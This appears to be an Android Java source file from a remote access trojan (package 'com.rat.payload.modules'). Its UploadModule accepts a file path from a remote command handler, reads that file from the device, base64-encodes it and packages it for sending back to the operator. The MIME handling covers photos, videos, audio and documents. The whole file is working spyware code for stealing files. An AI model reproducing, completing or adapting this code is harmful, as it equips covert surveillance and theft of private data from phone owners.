package com.rat.payload.modules;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;

public class UploadModule implements CommandHandler.Command {

    private static final String TAG = "UploadModule";
    private Context context;

    public UploadModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String path = args.getString("path");
            File file = new File(path);
            if (!file.exists()) {
                result.put("error", "File not found: " + path);
                return result;
            }
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            String b64 = Base64.encodeToString(bytes, Base64.DEFAULT);
            result.put("filename", file.getName());
            result.put("size", file.length());
            result.put("data", b64);
            result.put("mime", getMimeType(file.getName()));
        } catch (Exception e) {
            Log.e(TAG, "upload error: " + e.getMessage());
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    private String getMimeType(String filename) {
        if (filename.endsWith(".jpg") || filename.endsWith(".jpeg")) return "image/jpeg";
        if (filename.endsWith(".png")) return "image/png";
        if (filename.endsWith(".mp4")) return "video/mp4";
        if (filename.endsWith(".mp3")) return "audio/mpeg";
        if (filename.endsWith(".pdf")) return "application/pdf";
        if (filename.endsWith(".txt")) return "text/plain";
        return "application/octet-stream";
    }
}
